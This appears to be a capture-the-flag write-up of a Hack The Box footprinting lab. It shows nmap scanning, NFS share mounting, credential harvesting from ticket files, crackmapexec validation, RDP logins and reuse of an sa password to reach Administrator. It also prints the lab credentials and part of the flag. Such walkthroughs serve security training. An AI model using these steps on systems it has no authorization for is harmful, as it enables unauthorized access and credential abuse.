### CPTS / HTB Penetration Tester Path <br>
### Footprinting - Lab Medium <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Footprinting Lab - Medium

Second server: a server everyone on the internal network has access to. Find as much info as possible, then locate the credentials for the user `HTB`.

IP: 10.129.202.41

Hint: SSMS lets you edit the last 200 entries of a database. Every Windows system has an Administrator account.

Carryover state:
- given creds: `ceil:qwer1234`
- found later: `alex:lol123!mD`
- found later: `sa:87N1ns@slls83`

---

### Question 1:
Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.

#### Full TCP scan:

```diff
+ $ sudo nmap -sT -sV -sC -O -A -oA init_scan.txt -p- -v 10.129.202.41
```

	111/tcp   open  rpcbind
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	2049/tcp  open  nlockmgr
	3389/tcp  open  ms-wbt-server (Target_Name: WINMEDIUM)
	5985/tcp  open  http (WinRM)
	49664+    open  msrpc

#### NFS first:

```diff
+ $ showmount -e 10.129.202.41
```

	Export list for 10.129.202.41:
	/TechSupport (everyone)

#### Mount the share. As `nobody` perms blocked file access — ran as `root`:

```diff
+ $ mkdir targetnfs
+ $ sudo mount -t nfs 10.129.202.41:/ ./targetnfs -o nolock
+ $ sudo su
+ # cd targetnfs/TechSupport
```

#### Of the many ticket files, `ticket4238791283782.txt` had data — a chat transcript exposing an SMTP config:

	user="alex"
	password="lol123!mD"

#### Validated against SMB with crackmapexec:

```diff
+ $ crackmapexec smb 10.129.202.41 -u alex -p 'lol123!mD'
```

	[+] WINMEDIUM\alex:lol123!mD

#### RDP'd in (do NOT run as root):

```diff
+ $ xfreerdp /v:10.129.202.41 /u:alex /p:'lol123!mD'
```

#### Found new creds in `Devshare`: `sa:87N1ns@slls83`. SQL auth was denied for alex's user. RDP'd in as Administrator using the `sa` password (re-use):

```diff
+ $ xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83'
```

#### Opened SQL Server Management Studio, found table `dbo.devsacc`. Queried top 200 entries for `HTB`:

	HTB | lnch7ehrdn43i7AoqVPK4zWR

&#x1F6A9; found **lnch7ehrdn--edit--43i7AoqVPK4zWR**.
